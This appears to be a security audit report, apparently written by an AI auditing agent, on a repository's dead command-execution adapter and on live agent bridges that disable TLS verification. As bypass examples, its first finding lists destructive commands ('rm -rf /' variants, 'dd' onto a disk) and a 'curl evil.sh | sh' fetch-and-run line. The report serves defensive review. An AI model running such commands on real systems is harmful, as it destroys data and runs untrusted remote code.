# Specialist audit artifact

```text
Skill: hostile-dead-corner-auditor
Agent: hostile-dead-corner-auditor-workflow-agent

Scope:
  scripts/, hooks/pre-turn, adapters/cli-wrapper, adapters/hermes, adapters/model-proxy,
  integrations/ (agent-plugins, claude, codex, hermes, kilo, openclaw, opencode, qwen),
  plugins/example-plugin, deploy/scripts, and the live services those legacy/adapter
  paths claim to front (services/execution-proxy, services/tool-governance,
  services/mcp-gateway) to determine reachability.

Files/components inspected:
  - adapters/cli-wrapper/adapter.go, adapter_test.go
  - adapters/hermes/adapter.go, adapter_test.go
  - adapters/model-proxy/adapter.go, adapter_test.go
  - packages/execution-adapters/adapters.go, adapters_test.go
  - services/execution-proxy/cmd/server/main.go (live command-execution path, for comparison)
  - services/graphify-provider/cmd/server/graphify_test.go (fixture referencing cli-wrapper)
  - hooks/pre-turn/hook.json
  - plugins/example-plugin/manifest.json
  - scripts/scos-migrate, scripts/scos-wal-archive
  - scripts/install_agent_plugins.py
  - integrations/agent-plugins/scos-mcp-bridge.py (canonical shared bridge, installed to
    ~/.hermes/scripts/scos-mcp-bridge.py for every non-Claude-Code agent)
  - integrations/opencode/dot-opencode/scripts/scos-mcp-bridge.py (copy)
  - integrations/codex/plugins/scos-memory-fabric/scripts/scos-mcp-bridge.py (copy)
  - integrations/agent-plugins/gemini/scos-mcp-bridge.py, integrations/qwen/plugin/scos-launcher.py
    (thin launchers that exec the shared ~/.hermes/scripts/scos-mcp-bridge.py)
  - integrations/hermes/plugins/scos-memory/__init__.py
  - integrations/claude/desktop-extension/server/index.js
  - deploy/scripts/renew-mcp-gateway-cert.sh

Entry points inspected:
  - adapters/cli-wrapper Wrapper.ExecuteCommand (Go function, checked for callers/importers)
  - services/execution-proxy HTTP handlers: /v1/plan, /v1/execute, /v1/proxy/execute,
    /v1/proxy/restore, /v1/proxy/explain, /v1/rules (live command-execution surface)
  - stdio JSON-RPC entry point of scos-mcp-bridge.py (reads one line of JSON-RPC per
    stdin line, relays to mcp-gateway over HTTPS) — this is the live entry point every
    external agent (cline, cursor, windsurf, antigravity, qwen, openclaw, continue,
    gemini, kilo, codex, opencode) uses to reach services/mcp-gateway
  - scripts/install_agent_plugins.py install() — writes the bridge and per-agent MCP
    configs into the operator's home directory, wiring the above bridge in as the live path

Important callers/callees:
  - grep across the whole repo for "adapters/cli-wrapper", "cliwrapper", and
    "executionadapters"/"execution-adapters" import paths in non-test .go files: the only
    live callers are the package's own tests, plus one string literal in a graphify-provider
    test fixture that treats the package's source line as inert reference data, not code
    under exercise. Nothing in services/execution-proxy, services/tool-governance,
    services/mcp-gateway, cmd/, or any Dockerfile/compose file imports or spawns it.
  - services/execution-proxy's real command-execution path is self-contained in
    services/execution-proxy/cmd/server/main.go: classifyRisk() -> planCommand() ->
    tool-governance AuthorizeAndPrepare() -> executeCommand() (exec.CommandContext("/bin/sh","-c",...)).
    It does not import packages/execution-adapters or adapters/cli-wrapper at all.
  - scripts/install_agent_plugins.py copies
    integrations/agent-plugins/scos-mcp-bridge.py to ~/.hermes/scripts/scos-mcp-bridge.py
    and wires it into ~/.cline, ~/.cursor, ~/.codeium/windsurf, ~/.windsurf, ~/.config/Devin,
    ~/.gemini/*, ~/.qwen, ~/.openclaw, ~/.opencode, ~/.config/opencode, ~/.continue,
    ~/.config/kilo, and Codex's plugin registration — i.e. it is the actual, currently
    installed transport for essentially every supported agent except Claude Code's native
    http transport and the Claude Desktop extension's own separate Node relay.

Workflows traced:
  1. adapters/cli-wrapper "safety" workflow: ExecuteCommand -> DefaultAdapter.RewriteCommand
     -> exec.CommandContext("sh","-c", rewritten) -> DefaultAdapter.ReduceOutput. Traced
     RewriteCommand's actual logic in packages/execution-adapters/adapters.go: it does a
     single `strings.Contains(trimmed, "rm -rf /")` check and otherwise passes the command
     through unmodified. No other pattern, no allowlist, no tool-governance call, no auth
     context at all in this package.
  2. Live execution-proxy workflow (contrast case): validateExecutionRequest -> classifyRisk
     (broad destructive/write/test keyword classification, checked for compound-command
     evasion via `;|&\n\`)$(`) -> planCommand (forces "forensic" mode + passthrough for any
     destructive command unless explicitly confirmed) -> governance.AuthorizeAndPrepare
     (hard-fails closed via rejectingGovernance when SCOS_TOOL_GOVERNANCE_URL is unset) ->
     executeCommand. This is a materially different, considerably more defended
     implementation from the same "execution proxy" concept as adapters/cli-wrapper.
  3. External-agent MCP bridge workflow: agent writes JSON-RPC line to bridge stdin ->
     bridge builds headers (Authorization: Bearer <SCOS_BEARER_TOKEN>, X-SCOS-Tenant-ID,
     X-SCOS-Principal-ID, X-SCOS-Agent-Name) -> POSTs over HTTPS to SCOS_GATEWAY_URL
     (default https://100.93.75.87:8098/mcp) using an ssl.SSLContext built by ssl_ctx() ->
     relays mcp-gateway's JSON-RPC/SSE response back to stdout. Traced ssl_ctx() in all
     three live copies: it conditionally loads a CA file if present, then *unconditionally*
     overwrites `check_hostname = False` and `verify_mode = ssl.CERT_NONE` regardless of
     whether a CA was loaded — so the CA-loading branch is itself dead code and every
     connection is unauthenticated at the TLS layer.
  4. Contrast: integrations/hermes/plugins/scos-memory/__init__.py's _ssl_context() only
     disables verification when no CA file exists at SCOS_TLS_CA_PATH; when a CA is present
     it keeps full verification. This is the behavior the bridge's own dead CA-loading
     branch suggests was intended, so the bridge's implementation is a regression relative
     to a sibling integration solving the same problem correctly.
  5. deploy/scripts/renew-mcp-gateway-cert.sh confirms mcp-gateway's external endpoint is
     provisioned with a real Tailscale-issued Let's Encrypt certificate for
     rabuntu.tail2c15c8.ts.net specifically so that "external MCP clients (Claude Code
     --transport http, Claude Desktop Connectors)... can't pin the shared internal
     self-signed dev CA" — i.e. the infrastructure expects TLS verification to matter for
     exactly this externally-reachable endpoint, which is the one every non-Claude-Code
     bridge instance talks to with verification hard-disabled.

Trust boundaries:
  - Attacker/network boundary at services/mcp-gateway's externally reachable HTTPS listener
    (port 8098, per docs/agent-connection-guide.md background) — the TLS channel is the
    only thing standing between a network-position attacker and the bearer token +
    tenant/principal identity headers sent by every installed agent bridge.
  - Local-shell boundary in adapters/cli-wrapper and services/execution-proxy: both pass a
    caller-supplied string to `sh -c`; the trust boundary is whatever validation/governance
    happens before that call.
  - Package-reachability boundary: whether a piece of code is on the dependency graph of
    any actually-built/deployed binary (adapters/cli-wrapper and packages/execution-adapters
    are on neither).

Attacker-controlled inputs:
  - The `Command` string passed to adapters/cli-wrapper.Wrapper.ExecuteCommand (not
    attacker-reachable today — no live caller).
  - Network position between an installed agent (cline/cursor/windsurf/antigravity/qwen/
    openclaw/continue/gemini/kilo/codex/opencode) and mcp-gateway's external endpoint: an
    on-path or DNS/ARP-spoofing attacker can present any certificate and the bridge will
    accept it, then forward it the real bearer token on the first probe request.

Invariants tested:
  - "Destructive commands are blocked or require confirmation before reaching a shell" —
    holds in services/execution-proxy (classifyRisk + confirmed-required + governance
    gate), does NOT hold in adapters/cli-wrapper (a single substring check is the entire
    control).
  - "The internal fabric's TLS transport is authenticated end-to-end for
    externally-reachable traffic" — violated by every live copy of scos-mcp-bridge.py;
    holds for the Node relay (integrations/claude/desktop-extension/server/index.js, which
    uses Node's default fetch() certificate validation with no override) and for the
    hermes plugin's conditional CA path.

Findings:
  1. [Medium — dead code, not currently reachable] adapters/cli-wrapper/adapter.go +
     packages/execution-adapters/adapters.go implement a "command safety" layer whose
     entire malicious-command detection is
     `strings.Contains(trimmed, "rm -rf /")` (packages/execution-adapters/adapters.go:38),
     after which the command is executed verbatim via `sh -c` (adapters/cli-wrapper/adapter.go:31).
     Any of `rm  -rf /`, `rm -rf  /`, `sudo rm -rf /`, `RM -RF /`, `rm -rf /*`, or literally
     any other destructive command (`dd if=/dev/zero of=/dev/sda`, `curl evil.sh | sh`, a
     fork bomb, etc.) bypasses it trivially, and it applies no auth/tenant/governance
     checks at all — unlike the real services/execution-proxy implementation of the same
     concept. Confirmed via repo-wide grep that no service, Dockerfile, or compose file
     imports adapters/cli-wrapper or packages/execution-adapters outside their own test
     files; a services/graphify-provider test fixture references the file only as a string
     literal / synthetic code-index node, not as a dependency. Impact today is limited to
     "dead corner" risk: a future engineer who greps for "execution proxy" or "command
     safety" and finds this package could wire it in (or copy its pattern) believing it is
     a real safety control, silently reintroducing unauthenticated arbitrary command
     execution. Recommend deleting the package or adding a clear "unused / superseded by
     services/execution-proxy — do not wire this in" marker, and, if kept, at minimum
     replacing it with something that isn't a single substring check.

  2. [High — live, wired-in default] TLS certificate/hostname verification is
     unconditionally disabled in the shared external-agent MCP bridge that
     scripts/install_agent_plugins.py installs and wires into every supported non-Claude-Code
     agent (cline, cursor, windsurf, antigravity, qwen, openclaw, continue, gemini, kilo,
     codex, opencode):
       - integrations/agent-plugins/scos-mcp-bridge.py:80-88 (`ssl_ctx()`)
       - integrations/opencode/dot-opencode/scripts/scos-mcp-bridge.py:76-84 (identical copy)
       - integrations/codex/plugins/scos-memory-fabric/scripts/scos-mcp-bridge.py:76-84 (identical copy)
     Each of these builds an ssl.SSLContext, conditionally loading a CA file from
     SCOS_TLS_CA_PATH if present — then unconditionally sets `check_hostname = False` and
     `verify_mode = ssl.CERT_NONE` regardless of whether the CA load succeeded, with a
     comment claiming "This is an internal tailnet service — skip peer verification
     entirely." That claim is contradicted by deploy/scripts/renew-mcp-gateway-cert.sh,
     which exists specifically because mcp-gateway's externally reachable endpoint (used by
     "Claude Code --transport http, Claude Desktop Connectors" and, per this bridge's own
     default `SCOS_GATEWAY_URL = https://100.93.75.87:8098/mcp`, every other integrated
     agent) is provisioned with a real Tailscale/Let's Encrypt certificate precisely so
     verification is meaningful there. Every request carries `Authorization: Bearer
     <SCOS_BEARER_TOKEN>` plus `X-SCOS-Tenant-ID`/`X-SCOS-Principal-ID` in cleartext-onto-an-
     unauthenticated-TLS-channel; a network-position attacker (rogue AP, ARP/DNS spoofing on
     the shared tailnet or local network, compromised router) can MITM any of these agents'
     traffic to mcp-gateway, harvest the bearer token and tenant/principal identity, and
     replay or extend the session as that principal. This is a live default in currently
     installed integrations, not dead code — it only lands in "dead corner" scope because
     it is copy-pasted boilerplate that nobody revisits per-integration and each copy
     silently regressed a design that a sibling integration (see contrast below) got right.
     Contrast: integrations/hermes/plugins/scos-memory/__init__.py:60-65 implements the same
     CA-loading logic correctly — it disables verification only when no CA file is present,
     and verifies fully when one is. Recommend making all three bridge copies (or the single
     canonical one they should be deduplicated from) match that conditional behavior, and
     auditing whether SCOS_TLS_CA_PATH is actually populated in the deployed
     ~/.hermes/scos.env for real installs (if it never is, the effective behavior converges
     with the hermes plugin's, and the finding is about the code being 1-flip-away from
     unconditionally trusting any MITM cert rather than about current default install
     state — see Suspicions).

  3. [Low — hardening / dead-corner hygiene] plugins/example-plugin/manifest.json declares
     `required_permissions: ["memory:read","code:query"]` and a pre_turn hook, but nothing
     in the repo loads, validates, or registers it against any plugin-loading code path
     (no references outside the file itself found). If a real plugin loader is added later
     without an explicit allowlist/example-exclusion, this manifest's permission grants
     could be picked up as a template and copy-pasted forward without review. Recommend
     labeling it clearly as non-functional sample content only, or moving it under a
     docs/examples path that a loader would never scan.

Suspicions requiring validation:
  - Whether SCOS_TLS_CA_PATH is populated with a real, verifiable CA file in actual
    production installs of the agent bridges (default path
    `~/.hermes/scos-ca.crt`). If it is never populated in practice, Finding 2's practical
    exposure is "no verification, same as today, but for a different reason" (missing CA)
    rather than "verification is defeated even when a CA is configured" — but the code as
    written defeats it either way, and the dead CA-loading branch is itself evidence nobody
    has exercised this path recently. Could not verify without access to a real operator's
    ~/.hermes directory; not present in this repository checkout.
  - Whether integrations/agent-plugins/gemini/scos-mcp-bridge.py and
    integrations/qwen/plugin/scos-launcher.py (thin launchers that `execv` the shared
    ~/.hermes/scripts/scos-mcp-bridge.py) are the only two remaining agent entry points, or
    whether other agent directories (aider, kilo) also embed a further, undiscovered copy
    of the same disabled-verification pattern that grep did not surface because the file is
    named differently.

Tests/commands executed:
  - find scripts hooks adapters integrations plugins deploy -type f | sort
  - grep -rln "cli-wrapper\|cliwrapper" --include=*.go .
  - grep -rln "execution-adapters\|executionadapters" --include=*.go . (excluding self-tests)
  - grep -rn "adapters/cli-wrapper" --include=*.go . (excluding adapter.go/adapter_test.go)
  - grep -rln "cli-wrapper" deploy/ (no hits — not referenced in any deploy config)
  - for f in $(find integrations -name scos-mcp-bridge.py -o -name scos-launcher.py); grep
    -n "CERT_NONE|check_hostname|verify_mode|SCOS_MCP_DEBUG" "$f" — confirmed 3 live copies
    with identical unconditional TLS-verification disabling, 2 thin launchers with none
    (they exec the shared bridge).
  - grep -rn "debug|bypass|skip.*auth|SkipAuth|backdoor" -i services/tool-governance
    --include=*.go (excluding _test.go) — no hits; no admin/debug bypass found in
    tool-governance's Go source in this scope.
  - grep -rln "example-plugin|org.scos.plugins.example" --include=*.go . — no hits (manifest
    is unreferenced).
  - Read services/execution-proxy/cmd/server/main.go in full to establish it is the actual
    live command-execution implementation, distinct from and materially safer than
    adapters/cli-wrapper.

Coverage gaps:
  - Did not inspect adapters/http/adapter.go or adapters/mcp/adapter.go (out of the given
    scope hint's adapter list, but present in adapters/); a quick pass there could surface
    similar issues and was not performed under this specialist's time budget.
  - Did not review integrations/kilo/plugin/index.js, integrations/openclaw/plugin/src/index.ts,
    or integrations/opencode/plugin/scos-memory.ts source in depth — only grepped for the
    TLS pattern; other legacy/debug code paths in those TypeScript/JS plugin sources were
    not fully traced.
  - Did not review scripts/audit_governance.py, scripts/audit_governance_runtime.py,
    scripts/generate_code_index.py, scripts/validate_json.py, or
    scripts/verify_definition_of_done.py in depth (opened file listings/sizes only); these
    are candidate "maintenance/admin script" dead-corner targets not yet examined.
  - Did not examine deploy/native/*.env files or deploy/compose/*.yml for legacy/default
    credentials or debug flags left enabled — flagged as scope for a
    hostile-configuration-auditor pass rather than duplicated here.
  - Did not confirm whether services/mcp-gateway itself has any admin/debug endpoint that
    bypasses SCOS_INTERNAL_SERVICE_TOKEN or JWT claim checks (out of this specialist's
    scope hint; mcp-gateway internals belong to auth/authorization-focused specialists per
    the shared audit plan).
  - Did not exhaustively diff every one of the ~10 per-agent README/workflow/command files
    under integrations/agent-plugins/* and integrations/*/plugin/* for stale or
    contradictory setup instructions (e.g., ones that might tell an operator to point
    SCOS_TLS_CA_PATH somewhere that doesn't exist).

Areas explicitly not reviewed:
  - services/mcp-gateway, services/tool-governance HTTP handler logic beyond the grep above
    (owned by other specialists per the shared plan; only the TLS/execution "dead corner"
    surface for this specialist's scope was pursued in depth).
  - database/policies/ RLS logic (out of scope hint for this specialist; background context
    only).
  - Test suites' own contents beyond adapter_test.go headers (used only to confirm they are
    the sole callers of the dead adapters/cli-wrapper and packages/execution-adapters code).

Recommended follow-up:
  - Fix or delete adapters/cli-wrapper + packages/execution-adapters (Finding 1) before it
    can be mistaken for a real control and wired in.
  - Treat Finding 2 as the priority: fix `ssl_ctx()` in all three live bridge copies (ideally
    by deduplicating them into one canonical module the per-agent launchers import/exec,
    matching integrations/hermes/plugins/scos-memory/__init__.py's conditional CA logic),
    verify SCOS_TLS_CA_PATH is actually populated for real deployments, and consider
    escalating to the authentication/identity specialist given the bearer-token exposure
    implications across every non-Claude-Code integration.
  - Hand plugins/example-plugin (Finding 3) and the unreviewed scripts/*.py maintenance
    utilities to a follow-up dead-corner or configuration pass if time allows.
```
